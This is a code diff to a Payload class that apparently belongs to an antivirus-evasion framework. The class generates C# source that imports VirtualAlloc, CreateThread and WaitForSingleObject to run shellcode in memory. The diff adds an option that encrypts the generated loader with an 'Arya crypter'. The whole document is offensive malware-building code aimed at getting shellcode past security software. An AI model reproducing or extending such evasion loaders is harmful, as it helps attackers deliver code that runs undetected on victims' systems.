@@ -25,8 +25,8 @@ class Payload:
         
         self.shellcode = shellcode.Shellcode()
         # options we require user ineraction for- format is {Option : [Value, Description]]}
-        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"]}
-
+        self.required_options = {"compile_to_exe"   : ["Y", "Compile to an executable"],
+                                 "use_arya"         : ["N", "Use the Arya crypter"]}
         
     def generate(self):
         
@@ -93,5 +93,8 @@ class Payload:
         # payloadCode += "private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n"
         payloadCode += """[DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 %s,UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s,IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s); } }\n"""%(r[0],r[1],r[2],r[3],r[4],r[5],r[6],r[7],r[8],r[9],r[10],r[11])
 
+        if self.required_options["use_arya"][0].lower() == "y":
+            payloadCode = encryption.arya(payloadCode)
+            
         return payloadCode
 
